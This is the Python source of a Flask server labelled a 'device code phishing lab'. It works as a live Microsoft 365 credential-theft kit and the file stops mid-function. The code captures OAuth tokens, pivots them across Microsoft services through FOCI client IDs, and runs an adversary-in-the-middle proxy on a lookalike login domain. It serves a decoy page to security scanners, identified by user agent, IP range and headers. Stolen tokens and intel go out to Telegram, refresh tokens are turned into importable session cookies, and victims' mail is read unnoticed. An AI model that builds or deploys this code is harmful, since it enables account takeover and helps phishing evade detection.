#!/usr/bin/env python3
"""
Device Code Phishing Lab — Tier One Server
Auto-generates device codes, captures tokens, auto-pivots via FOCI,
dumps intel, sends Telegram alerts, and provides an admin dashboard.

Config: config.yaml (all settings centralized)
"""

import os
import re
import sys
import json
import time
import base64
import threading
import requests
import logging
import hashlib
import secrets
from datetime import datetime, timezone
from flask import Flask, render_template, jsonify, request, redirect, abort, make_response

# ─── BlessedHands Modules ────────────────────────────────────────────
from storage import TokenStore, create_store
from logging_config import setup_logging
from ssl_manager import ensure_certs

# ─── Config Loader ───────────────────────────────────────────────────
DATA_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(DATA_DIR, "config.yaml")

def _load_config():
    """Load config.yaml. Falls back to defaults if missing."""
    defaults = {
        "server": {"host": "0.0.0.0", "port": 443, "domain": "",
                    "ssl": {"cert": "../certs/server.crt", "key": "../certs/server.key",
                            "letsencrypt": False, "le_cert": "", "le_key": ""}},
        "admin": {"password": "admin", "session_hours": 24},
        "oauth": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
                  "resource": "https://graph.microsoft.com/"},
        "turnstile": {"enabled": True, "site_key": "0x4AAAAAAEA-RpopK-E_s7qU", "secret_key": "0x4AAAAAAEA-RsgzFbVFoH6oMuMnxQu7Os4"},
        "protection": {
            "rate_limit": {"max_requests": 5, "window_seconds": 900},
            "admin_ips": [], "anti_fingerprint": True, "max_payload_kb": 512,
            "session_ttl_minutes": 30,
            "blocked_ua_patterns": [
                "bot", "crawler", "spider", "curl", "wget", "python-requests",
                "scrapy", "httpclient", "urlscan", "virustotal", "phishtank",
                "googlebot", "bingbot", "slurp", "duckduckbot", "semrush",
                "ahrefs", "mj12bot", "dotbot", "petalbot", "yandex",
            ],
        },
        "telegram": {"bot_token": "", "chat_id": ""},
        "aitm": {"enabled": True, "proxy_domain": "login-microsoftonline.hednickbrother.com"},
        "foci": {
            "outlook": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://outlook.office365.com/"},
            "teams":   {"client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264", "resource": "https://api.spaces.skype.com/"},
            "sharepoint": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://*.sharepoint.com/"},
            "azure":   {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://management.azure.com/"},
            "onedrive": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://officeapps.live.com/"},
        },
    }
    if not os.path.exists(CONFIG_PATH):
        return defaults
    try:
        import yaml
        with open(CONFIG_PATH) as f:
            user = yaml.safe_load(f) or {}
        # Deep merge: user values override defaults
        def merge(base, over):
            for k, v in over.items():
                if isinstance(v, dict) and isinstance(base.get(k), dict):
                    merge(base[k], v)
                else:
                    base[k] = v
        merge(defaults, user)
    except ImportError:
        # Fallback: parse YAML manually for simple key:value
        logging.warning("PyYAML not installed — using defaults. Install: pip install pyyaml")
    except Exception as e:
        logging.warning(f"Config load error: {e} — using defaults")
    return defaults

CFG = _load_config()

# ─── Resolve Config Values ──────────────────────────────────────────
LISTEN_HOST = CFG["server"]["host"]
LISTEN_PORT = CFG["server"]["port"]
SERVER_DOMAIN = CFG["server"]["domain"]
CLIENT_ID = CFG["oauth"]["client_id"]
RESOURCE = CFG["oauth"]["resource"]
TOKEN_LOG = os.path.join(DATA_DIR, "captured_tokens.json")
TOKEN_BACKUP = TOKEN_LOG + ".backup"
_token_write_lock = threading.Lock()


def _safe_load_tokens():
    """Load tokens with corruption recovery."""
    for path in [TOKEN_LOG, TOKEN_BACKUP]:
        if os.path.exists(path):
            try:
                with open(path) as f:
                    data = json.load(f)
                if isinstance(data, list):
                    return data
            except (json.JSONDecodeError, IOError) as e:
                log.warning(f"⚠️ Token file corrupted ({path}): {e}")
                continue
    return []


def _safe_save_tokens(tokens):
    """Atomic write with backup rotation. Never lose data."""
    with _token_write_lock:
        # 1. Ensure all token values are JSON-safe (strip control chars)
        safe_json = json.dumps(tokens, indent=2, ensure_ascii=True)

        # 2. Validate it parses back correctly
        try:
            json.loads(safe_json)
        except json.JSONDecodeError:
            log.error("❌ Token data failed validation — refusing to write corrupted data")
            return False

        # 3. Backup current file before overwriting
        if os.path.exists(TOKEN_LOG):
            try:
                import shutil
                shutil.copy2(TOKEN_LOG, TOKEN_BACKUP)
            except IOError:
                pass

        # 4. Atomic write: write to temp file then rename (prevents partial writes)
        tmp_path = TOKEN_LOG + ".tmp"
        try:
            with open(tmp_path, "w") as f:
                f.write(safe_json)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp_path, TOKEN_LOG)  # atomic on POSIX
            return True
        except IOError as e:
            log.error(f"❌ Failed to write tokens: {e}")
            # Restore from backup
            if os.path.exists(TOKEN_BACKUP):
                try:
                    import shutil
                    shutil.copy2(TOKEN_BACKUP, TOKEN_LOG)
                    log.info("🔄 Restored tokens from backup")
                except:
                    pass
            return False
INTEL_DIR = os.path.join(DATA_DIR, "intel")
TELEGRAM_CONFIG = os.path.join(DATA_DIR, "..", "telegram.config")
CERT_DIR = os.path.join(DATA_DIR, "..", "certs")
FOCI_TARGETS = CFG["foci"]

# Turnstile
TURNSTILE_ENABLED = CFG["turnstile"]["enabled"]
TURNSTILE_SITE_KEY = CFG["turnstile"]["site_key"]
TURNSTILE_SECRET_KEY = CFG["turnstile"]["secret_key"]

# Protection
RATE_MAX = CFG["protection"]["rate_limit"]["max_requests"]
RATE_WINDOW = CFG["protection"]["rate_limit"]["window_seconds"]
ADMIN_IPS = CFG["protection"]["admin_ips"]
ANTI_FP = CFG["protection"]["anti_fingerprint"]
MAX_PAYLOAD = CFG["protection"]["max_payload_kb"] * 1024
SESSION_TTL = CFG["protection"]["session_ttl_minutes"] * 60
BOT_PATTERNS = CFG["protection"]["blocked_ua_patterns"]

# Admin auth
ADMIN_PASSWORD = CFG["admin"]["password"]
ADMIN_SESSION_HOURS = CFG["admin"]["session_hours"]
admin_sessions = {}  # {token: {expires, role, operator_id, username}}

# ─── TOTP (Admin 2FA) ─────────────────────────────────────────────────
TOTP_SECRET_FILE = os.path.join(DATA_DIR, ".totp_secret")

def _totp_secret():
    """Return the stored TOTP secret, or None if 2FA is not configured."""
    if os.path.exists(TOTP_SECRET_FILE):
        try:
            with open(TOTP_SECRET_FILE) as f:
                return f.read().strip() or None
        except Exception:
            pass
    return None

def _totp_verify(code: str) -> bool:
    """Verify a 6-digit TOTP code against the stored secret. Window ±1 step."""
    secret = _totp_secret()
    if not secret:
        return True  # 2FA not configured — let login proceed
    try:
        import pyotp
        totp = pyotp.TOTP(secret)
        return totp.verify(code, valid_window=1)
    except ImportError:
        log.warning("⚠️ pyotp not installed — TOTP check skipped. Run: pip install pyotp")
        return True

def _totp_generate_secret() -> str:
    """Generate and persist a new TOTP secret. Returns the base32 secret."""
    import pyotp, base64 as _b64
    secret = pyotp.random_base32()
    with open(TOTP_SECRET_FILE, "w") as f:
        f.write(secret)
    os.chmod(TOTP_SECRET_FILE, 0o600)
    return secret

# ─── Operator Storage ──────────────────────────────────────────────
OPERATORS_FILE = os.path.join(DATA_DIR, "operators.json")
_operators_lock = threading.Lock()

# ─── Audit Log ────────────────────────────────────────────────────────
AUDIT_LOG_FILE = os.path.join(DATA_DIR, "audit_log.jsonl")
_audit_lock = threading.Lock()

def audit(action: str, detail: str = "", target: str = ""):
    """Append one audit entry. Non-blocking; failures are logged but never raise."""
    try:
        op = _get_current_operator()
        entry = {
            "ts": now_utc().isoformat(),
            "operator_id": op.get("operator_id", "unknown"),
            "username": op.get("username", "unknown"),
            "role": op.get("role", "unknown"),
            "ip": request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip(),
            "action": action,
            "target": target,
            "detail": detail,
        }
        line = json.dumps(entry) + "\n"
        with _audit_lock:
            with open(AUDIT_LOG_FILE, "a") as f:
                f.write(line)
            # Rotate: keep last 5000 entries so the file never grows unbounded
            try:
                with open(AUDIT_LOG_FILE) as f:
                    lines = f.readlines()
                if len(lines) > 5000:
                    with open(AUDIT_LOG_FILE, "w") as f:
                        f.writelines(lines[-5000:])
            except Exception:
                pass
    except Exception as _e:
        log.warning(f"⚠️ Audit log write failed: {_e}")

def _require_admin():
    """Return a 403 Response if the current session is not admin, else None."""
    current = _get_current_operator()
    if current["role"] != "admin":
        return jsonify({"error": "forbidden — admin only"}), 403
    return None

def _load_operators():
    """Load operator list from disk."""
    if os.path.exists(OPERATORS_FILE):
        try:
            with open(OPERATORS_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return []

def _save_operators(ops):
    """Save operator list atomically."""
    tmp = OPERATORS_FILE + ".tmp"
    with open(tmp, "w") as f:
        json.dump(ops, f, indent=2, ensure_ascii=True)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, OPERATORS_FILE)

def _get_session_info(token_str):
    """Get session info for an admin_token. Returns {role, operator_id, username} or None."""
    info = admin_sessions.get(token_str)
    if info is None:
        return None
    # Handle legacy format (just a timestamp)
    if isinstance(info, (int, float)):
        if info < time.time():
            return None
        return {"role": "admin", "operator_id": "admin", "username": "admin", "expires": info}
    # New format (dict)
    if info.get("expires", 0) < time.time():
        return None
    return info

def _get_current_operator():
    """Get the current operator from the request cookie. Returns {role, operator_id, username}."""
    token = request.cookies.get("admin_token", "")
    return _get_session_info(token) or {"role": "admin", "operator_id": "admin", "username": "admin"}

# AiTM Proxy
AITM_ENABLED = CFG.get("aitm", {}).get("enabled", False)
AITM_PROXY_DOMAIN = CFG.get("aitm", {}).get("proxy_domain", "")

# Brute-force lockout: {ip: {"attempts": int, "locked_until": float, "timestamps": []}}
login_attempts = {}
LOGIN_MAX_ATTEMPTS = 5
LOGIN_LOCKOUT_SECONDS = 900  # 15 minutes

# Ghost Mode: when ON, reading emails does NOT mark them as read on the server
GHOST_MODE = True  # Default ON per user requirement

# Mail polling tracker: {idx: {"last_id": str, "last_check": float}}
mail_poll_state = {}

# Landing paths that need Turnstile protection
LANDING_PATHS = {"/share", "/teams", "/secure", "/docusign", "/zoom"}

# ─── Logging (Console + CloudWatch) ──────────────────────────────────
_log_root, _cloudwatch_active = setup_logging(
    enable_cloudwatch=True,
    region=CFG.get("storage", {}).get("dynamodb", {}).get("region", "us-east-1")
)
log = logging.getLogger("landing")

# ─── Storage Layer (DynamoDB + Redis → Local JSON fallback) ──────────
CFG["_data_dir"] = DATA_DIR
CFG.setdefault("storage", {
    "backend": "auto",
    "dynamodb": {"table_name": "HednickCapturedTokens", "region": "us-east-1"},
    "redis": {"host": "hednick-redis.pgflml.0001.use1.cache.amazonaws.com", "port": 6379, "ttl_seconds": 300}
})
store = create_store(CFG)
log.info(f"📦 Storage backend: {store.backend_info}")

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = MAX_PAYLOAD

# ─── Scanner Cloaking Middleware ─────────────────────────────────────
import ipaddress as _ipaddress
from flask import Response as _FlaskResponse

# Neutral corporate portal — NO recognizable branding.
# M365/Google lookalikes get flagged by content scanners; this does not.
_CLOAK_DECOY = b"""<!DOCTYPE html>
<html lang="en"><head><title>Employee Self-Service Portal</title>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
.wrap{background:#fff;border-radius:6px;padding:40px 36px;width:100%;max-width:380px;box-shadow:0 1px 4px rgba(0,0,0,.12)}
.brand{font-size:13px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#6b7280;margin-bottom:28px}
h1{font-size:17px;font-weight:600;color:#111827;margin-bottom:6px}
.sub{font-size:13px;color:#6b7280;margin-bottom:24px}
label{display:block;font-size:12px;font-weight:500;color:#374151;margin-bottom:4px}
input[type=text],input[type=password]{width:100%;border:1px solid #d1d5db;border-radius:4px;padding:9px 10px;font-size:14px;margin-bottom:14px;color:#111}
input:focus{outline:none;border-color:#4f46e5;box-shadow:0 0 0 2px rgba(79,70,229,.15)}
.btn{width:100%;background:#4f46e5;color:#fff;border:none;border-radius:4px;padding:10px;font-size:14px;font-weight:500;cursor:pointer;margin-top:4px}
.btn:hover{background:#4338ca}
.footer{margin-top:28px;font-size:11px;color:#9ca3af;text-align:center;border-top:1px solid #f3f4f6;padding-top:16px}
</style></head>
<body><div class="wrap">
<div class="brand">Corporate IT</div>
<h1>Employee Portal</h1>
<div class="sub">Sign in with your network credentials.</div>
<form method="post" onsubmit="return false">
<label for="u">Username</label>
<input type="text" id="u" name="username" placeholder="username@company.com" autocomplete="username">
<label for="p">Password</label>
<input type="password" id="p" name="password" placeholder="Password" autocomplete="current-password">
<button class="btn" type="submit">Sign In</button>
</form>
<div class="footer">IT Help Desk &nbsp;|&nbsp; Password Reset &nbsp;|&nbsp; &copy; 2025 Corporate IT Services</div>
</div></body></html>"""

_CLOAK_SCANNER_UAS = [
    "bot","crawl","spider","scan","urlscan","virustotal","phishtank","netcraft",
    "sophos","fortinet","fortigate","fortimail","bitdefender","bdbot","gdata","g-data",
    "vipre","lionic","seclookup","alphamountain","cyradar","chonglua","chong lua",
    "proofpoint","mimecast","barracuda","ironport","fireeye","trellix","symantec",
    "broadcom","messagelabs","trendmicro","trend micro","zscaler","googlebot",
    "google-safety","googlesafebrowsing","google-inspectiontool","python-requests",
    "python-urllib","libwww","wget","curl","httpie","go-http-client","java/","okhttp",
    "axios","node-fetch","headlesschrome","phantomjs","selenium","puppeteer","playwright",
    "preview","facebookexternalhit","twitterbot","telegrambot","slackbot","discordbot",
    "whatsapp","linkedinbot","urlvoid","hybrid-analysis","any.run","joesandbox","cuckoo",
]

_CLOAK_SCANNER_CIDRS = [
    # Microsoft SafeLinks/Defender
    "20.33.0.0/16","20.40.0.0/13","20.128.0.0/16","40.92.0.0/14","40.96.0.0/12",
    "40.112.0.0/13","52.96.0.0/12","52.112.0.0/14","104.40.0.0/13","104.208.0.0/13",
    "131.253.0.0/16","132.245.0.0/16","150.171.0.0/16","157.56.0.0/14","204.79.197.0/24",
    # Google Safe Browsing / VirusTotal (runs on GCP)
    "64.233.160.0/19","66.102.0.0/20","66.249.64.0/19","72.14.192.0/18","74.125.0.0/16",
    "108.177.0.0/17","142.250.0.0/15","172.217.0.0/16","173.194.0.0/16","209.85.128.0/17",
    "216.58.192.0/19","216.239.32.0/19","34.64.0.0/10","35.184.0.0/13","35.192.0.0/12",
    # AWS (cloud sandbox infra — specific ranges, not broad /8 blocks)
    "52.90.0.0/15","52.200.0.0/13","54.144.0.0/12","54.208.0.0/13",
    "3.80.0.0/12","3.208.0.0/12","13.32.0.0/12","18.144.0.0/12","18.208.0.0/13",
    # Proofpoint
    "67.231.148.0/22","67.231.152.0/22","148.163.128.0/17",
    # Mimecast
    "91.220.42.0/24","207.211.30.0/23","205.139.104.0/21",
    # Fortinet/FortiGuard
    "208.91.112.0/20","66.35.60.0/24","66.35.62.0/24",
    # BitDefender
    "91.199.104.0/22","91.199.108.0/22",
    # Sophos
    "195.150.216.0/24","195.150.217.0/24","188.172.192.0/20",
    # alphaMountain
    "143.244.0.0/16",
    # VIPRE
    "209.205.220.0/24",
    # G-Data
    "217.110.110.0/24",
    # Lionic
    "101.33.0.0/16","43.154.0.0/16",
    # CyRadar / Chong Lua Dao
    "103.28.0.0/14","113.171.0.0/16","103.92.0.0/14",
    # Zscaler
    "104.129.192.0/20","136.226.0.0/16","165.225.0.0/17",
]
_CLOAK_NETS = [_ipaddress.ip_network(c, strict=False) for c in _CLOAK_SCANNER_CIDRS]

_CLOAK_SCANNER_HEADERS = {
    "x-ms-exchange-organization-authas","x-ms-exchange-crosstenant-authas",
    "x-ms-traffictypediagnostic","x-forefront-antispam-report",
    "x-pp-correlation-id","x-mimecast-impersonation-protect",
    "x-barracuda-connect","x-ironport-anti-spam",
}

def _cloak_is_scanner():
    """Return True if this request looks like a scanner/AV crawler."""
    # Skip admin routes — always pass through
    path = request.path
    if path.startswith("/admin") or path == "/health" or path.startswith("/api/"):
        return False

    ua = (request.headers.get("User-Agent") or "").lower()

    # Real browsers start with Mozilla/5.0 and don't contain bot keywords
    is_browser = ua.startswith("mozilla/5.0")
    if is_browser:
        for kw in ["bot","crawl","spider","headlesschrome","phantomjs","selenium",
                   "puppeteer","playwright","preview","slackbot","discordbot",
                   "telegrambot","whatsapp","facebookexternalhit","linkedinbot","twitterbot"]:
            if kw in ua:
                return True
        # Real browser — check IP only
    else:
        # Non-browser UA — check against scanner list
        if not ua:
            return True  # no UA = scanner
        for kw in _CLOAK_SCANNER_UAS:
            if kw in ua:
                return True

    # IP check
    try:
        forwarded = request.headers.get("X-Forwarded-For", "")
        visitor_ip = forwarded.split(",")[0].strip() if forwarded else request.remote_addr
        addr = _ipaddress.ip_address(visitor_ip)
        for net in _CLOAK_NETS:
            if addr in net:
                return True
    except Exception:
        pass

    # Header check
    hdr_keys = {k.lower() for k in request.headers.keys()}
    if hdr_keys & _CLOAK_SCANNER_HEADERS:
        return True

    return False

@app.before_request
def _cloak_scanners():
    """Intercept scanner requests before they hit any route."""
    if _cloak_is_scanner():
        log.info(f"🛡️ Cloaked scanner: {request.remote_addr} UA={request.headers.get('User-Agent','')[:80]}")
        return _FlaskResponse(_CLOAK_DECOY, status=200, mimetype="text/html")

# ─── AiTM Proxy Blueprint ────────────────────────────────────────────
if AITM_ENABLED and AITM_PROXY_DOMAIN:
    try:
        from aitm_proxy import aitm as aitm_bp, init_aitm
        init_aitm(AITM_PROXY_DOMAIN, DATA_DIR, telegram_callback=None)  # telegram wired later
        app.register_blueprint(aitm_bp, url_prefix="/aitm")
        log.info(f"🔀 AiTM proxy enabled at /aitm → login.microsoftonline.com")
    except ImportError as e:
        log.warning(f"⚠️  AiTM proxy module not found: {e}")
        AITM_ENABLED = False

# ─── Connection Pool (reuse HTTP connections to Graph API) ───────────
graph_session = requests.Session()
graph_session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
})
adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20, max_retries=2)
graph_session.mount("https://", adapter)

# ─── Session Tracking ────────────────────────────────────────────────
sessions = {}
sessions_lock = threading.Lock()
rate_limits = {}

os.makedirs(INTEL_DIR, exist_ok=True)


# ─── SSE Live Capture Push ───────────────────────────────────────────
import queue as _queue
_sse_listeners = []          # list of queue.Queue, one per connected client
_sse_listeners_lock = threading.Lock()

def _sse_broadcast(event_type: str, data: dict, operator_id: str = ""):
    """Push an event to connected SSE clients.
    Admin clients receive all events. Operator clients receive only their own captures.
    """
    import json as _json
    payload = f"event: {event_type}\ndata: {_json.dumps(data)}\n\n"
    with _sse_listeners_lock:
        dead = []
        for q, sse_op_id, sse_role in _sse_listeners:
            # Admins see everything; operators only see their own
            if sse_role != "admin" and operator_id and sse_op_id != operator_id:
                continue
            try:
                q.put_nowait(payload)
            except _queue.Full:
                dead.append(q)
        for q, _, _ in dead:
            _sse_listeners[:] = [(qq, o, r) for qq, o, r in _sse_listeners if qq is not q]

@app.route("/admin/api/events")
def api_sse_events():
    """Server-Sent Events stream — pushes live capture notifications to panel."""
    # Must be authenticated
    token = request.cookies.get("admin_token", "")
    if not _get_session_info(token):
        return jsonify({"error": "unauthorized"}), 401

    session_info = _get_session_info(token)
    sse_op_id = session_info.get("operator_id", "admin")
    sse_role = session_info.get("role", "operator")

    q = _queue.Queue(maxsize=64)
    with _sse_listeners_lock:
        _sse_listeners.append((q, sse_op_id, sse_role))

    def stream():
        try:
            # Initial heartbeat so the browser EventSource connects immediately
            yield "event: ping\ndata: {}\n\n"
            while True:
                try:
                    msg = q.get(timeout=25)
                    yield msg
                except _queue.Empty:
                    yield "event: ping\ndata: {}\n\n"
        finally:
            with _sse_listeners_lock:
                _sse_listeners[:] = [(qq, o, r) for qq, o, r in _sse_listeners if qq is not q]

    resp = _FlaskResponse(stream(), mimetype="text/event-stream")
    resp.headers["Cache-Control"] = "no-cache"
    resp.headers["X-Accel-Buffering"] = "no"
    return resp

@app.route("/admin/api/audit")
def api_audit_log():
    """Return recent audit log entries (admin only, last 500)."""
    block = _require_admin()
    if block:
        return block
    entries = []
    try:
        if os.path.exists(AUDIT_LOG_FILE):
            with open(AUDIT_LOG_FILE) as f:
                lines = f.readlines()
            for line in lines[-500:]:
                try:
                    entries.append(json.loads(line.strip()))
                except Exception:
                    pass
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    return jsonify({"entries": list(reversed(entries))})

# ─── Security Middleware ─────────────────────────────────────────────
@app.after_request
def harden_response(response):
    """Strip fingerprints, add security headers."""
    # SSE streams must not have headers that cause proxies to buffer or close the connection
    if response.mimetype == "text/event-stream":
        return response
    if ANTI_FP:
        response.headers.pop("Server", None)
        response.headers.pop("X-Powered-By", None)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "no-referrer"
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        # Only send HSTS when using a valid cert (not self-signed)
        if CFG["server"]["ssl"].get("letsencrypt"):
            response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response


@app.before_request
def enforce_protection():
    """Admin password gate + IP whitelist + Turnstile + auth-gate public APIs."""
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()

    # ── Auth-gate: /admin/* AND /api/* behind admin login ──
    auth_required = request.path.startswith("/admin") or request.path.startswith("/api/")
    auth_skip = request.path in ("/admin/login", "/admin/api/auth", "/admin/api/oauth-complete", "/admin/api/settings/totp/status") or request.path.startswith("/aitm")

    if auth_required and not auth_skip:
        token = request.cookies.get("admin_token", "")
        session_info = _get_session_info(token)
        if session_info is None:
            if request.path.startswith("/api/") or request.path.startswith("/admin/api"):
                return jsonify({"error": "unauthorized"}), 401
            return redirect("/admin/login")

    # ── Admin IP whitelist ──
    if (request.path.startswith("/admin") or request.path.startswith("/api/")) and ADMIN_IPS:
        if client_ip not in ADMIN_IPS:
            abort(404)

    # ── Turnstile verification on landing pages (POST only) ──
    if TURNSTILE_ENABLED and request.method == "POST" and request.path in LANDING_PATHS:
        token = request.form.get("cf-turnstile-response", "")
        if token:
            try:
                vr = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
                    "secret": TURNSTILE_SECRET_KEY,
                    "response": token,
                    "remoteip": request.remote_addr,
                }, timeout=5)
                if not vr.json().get("success"):
                    log.warning(f"🛡️ Turnstile rejected: {client_ip}")
                    abort(403)
            except Exception:
                pass  # fail-open: don't block if Turnstile API is down


# ─── Helpers ─────────────────────────────────────────────────────────
def now_utc():
    return datetime.now(timezone.utc)


def decode_jwt(token):
    """Decode JWT payload without verification."""
    try:
        parts = token.split(".")
        padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
        return json.loads(base64.b64decode(padded))
    except Exception:
        return {}


def _sanitize_email_html(html_content):
    """Sanitize email HTML to prevent XSS when rendering in the mailbox viewer.
    Strips: <script>, <iframe>, <object>, <embed>, <form>, event handlers, javascript: URIs."""
    if not html_content:
        return ""
    # Remove script tags and their contents
    sanitized = re.sub(r'<script[\s\S]*?</script>', '', html_content, flags=re.IGNORECASE)
    # Remove iframe, object, embed, form, applet tags
    for tag in ('iframe', 'object', 'embed', 'form', 'applet', 'meta', 'link'):
        sanitized = re.sub(rf'<{tag}[\s\S]*?(?:/>|</{tag}>)', '', sanitized, flags=re.IGNORECASE)
        sanitized = re.sub(rf'<{tag}[^>]*>', '', sanitized, flags=re.IGNORECASE)
    # Remove event handlers (on*)
    sanitized = re.sub(r'\s+on\w+\s*=\s*["\'][^"\']*["\']', '', sanitized, flags=re.IGNORECASE)
    sanitized = re.sub(r'\s+on\w+\s*=\s*\S+', '', sanitized, flags=re.IGNORECASE)
    # Remove javascript: URIs
    sanitized = re.sub(r'href\s*=\s*["\']javascript:[^"\']*["\']', 'href="#"', sanitized, flags=re.IGNORECASE)
    sanitized = re.sub(r'src\s*=\s*["\']javascript:[^"\']*["\']', 'src=""', sanitized, flags=re.IGNORECASE)
    # Remove data: URIs in src (but allow data:image for inline images)
    sanitized = re.sub(r'src\s*=\s*["\']data:(?!image/)[^"\']*["\']', 'src=""', sanitized, flags=re.IGNORECASE)
    return sanitized


def is_bot(ua):
    """Check if User-Agent matches known bot/scanner patterns."""
    if not ua:
        return True
    ua_lower = ua.lower()
    return any(re.search(p, ua_lower) for p in BOT_PATTERNS)


def check_rate_limit(ip, max_requests=None, window=None):
    """Sliding window rate limiter."""
    max_requests = max_requests or RATE_MAX
    window = window or RATE_WINDOW
    now = time.time()
    if ip not in rate_limits:
        rate_limits[ip] = []
    rate_limits[ip] = [t for t in rate_limits[ip] if now - t < window]
    if len(rate_limits[ip]) >= max_requests:
        return False
    rate_limits[ip].append(now)
    return True


def verify_turnstile(token):
    """Verify a Cloudflare Turnstile token server-side."""
    if not TURNSTILE_ENABLED or not token:
        return True  # skip if disabled
    try:
        r = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
            "secret": TURNSTILE_SECRET_KEY,
            "response": token,
        }, timeout=5)
        return r.json().get("success", False)
    except Exception:
        return True  # fail-open


def session_cleanup():
    """Background thread: auto-expire stale sessions + clean rate limits."""
    while True:
        time.sleep(300)  # every 5 min
        now = time.time()
        with sessions_lock:
            expired = [k for k, s in sessions.items()
                       if s.get("status") == "active" and
                       (now - s.get("_created_ts", now)) > SESSION_TTL]
            for k in expired:
                sessions[k]["status"] = "expired"
            if expired:
                log.info(f"🧹 Cleaned {len(expired)} stale sessions")
        # Clean old rate limit entries
        old_ips = [ip for ip, ts in rate_limits.items() if not ts or (now - max(ts)) > RATE_WINDOW]
        for ip in old_ips:
            del rate_limits[ip]


# ─── Telegram ────────────────────────────────────────────────────────
def load_telegram_config():
    config = {}
    paths = [TELEGRAM_CONFIG, "/opt/device-code-phishing-lab/telegram.config"]
    for p in paths:
        p = os.path.normpath(p)
        if os.path.exists(p):
            with open(p) as f:
                for line in f:
                    line = line.strip()
                    if "=" in line and not line.startswith("#"):
                        key, val = line.split("=", 1)
                        config[key.strip()] = val.strip().strip('"').strip("'")
            break
    return config


def send_telegram_alert(message):
    config = load_telegram_config()
    if config.get("TELEGRAM_ENABLED") != "true":
        return
    bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
    chat_id = config.get("TELEGRAM_CHAT_ID", "")
    if not bot_token or not chat_id:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"},
            timeout=10,
        )
        log.info("📱 Telegram alert sent")
    except Exception as e:
        log.warning(f"Telegram alert failed: {e}")


def send_telegram_document(content, filename, caption=""):
    """Send a text file as a Telegram document (for clean JSON exports)."""
    config = load_telegram_config()
    if config.get("TELEGRAM_ENABLED") != "true":
        return
    bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
    chat_id = config.get("TELEGRAM_CHAT_ID", "")
    if not bot_token or not chat_id:
        return
    try:
        import io
        file_obj = io.BytesIO(content.encode("utf-8"))
        file_obj.name = filename
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendDocument",
            data={"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"},
            files={"document": (filename, file_obj, "application/json")},
            timeout=15,
        )
        log.info(f"📱 Telegram document sent: {filename}")
    except Exception as e:
        log.warning(f"Telegram document failed: {e}")


def generate_session_cookies(refresh_token):
    """Generate ESTSAUTH cookies from refresh token for Cookie Editor import."""
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    result = {"cookie_editor_import": [], "tokens": {}}

    cookie_resources = {
        "graph": {"cid": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "res": "https://graph.microsoft.com/"},
        "outlook": {"cid": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "res": "https://outlook.office365.com/"},
        "substrate": {"cid": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "res": "https://substrate.office.com/"},
        "azure_mgmt": {"cid": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "res": "https://management.azure.com/"},
        "aad_graph": {"cid": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "res": "https://graph.windows.net/"},
    }

    estsauth = ""
    for name, params in cookie_resources.items():
        try:
            r = requests.post(
                "https://login.microsoftonline.com/Common/oauth2/token",
                data={
                    "client_id": params["cid"],
                    "grant_type": "refresh_token",
                    "refresh_token": refresh_token,
                    "resource": params["res"],
                },
                headers=ua, timeout=15,
            )
            if r.status_code == 200:
                data = r.json()
                result["tokens"][name] = {
                    "access_token": data.get("access_token", ""),
                    "id_token": data.get("id_token", ""),
                    "refresh_token": data.get("refresh_token", refresh_token),
                }
        except Exception:
            pass

    # Use v2.0 endpoint with openid scope to get id_token for ESTSAUTH cookie
    # (v1.0 endpoint does not return id_token for resource-based requests)
    try:
        r = requests.post(
            "https://login.microsoftonline.com/Common/oauth2/v2.0/token",
            data={
                "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "scope": "openid profile offline_access https://graph.windows.net/.default",
            },
            headers=ua, timeout=15,
        )
        if r.status_code == 200:
            estsauth = r.json().get("id_token", "")
    except Exception:
        pass

    if estsauth:
        result["cookie_editor_import"] = [
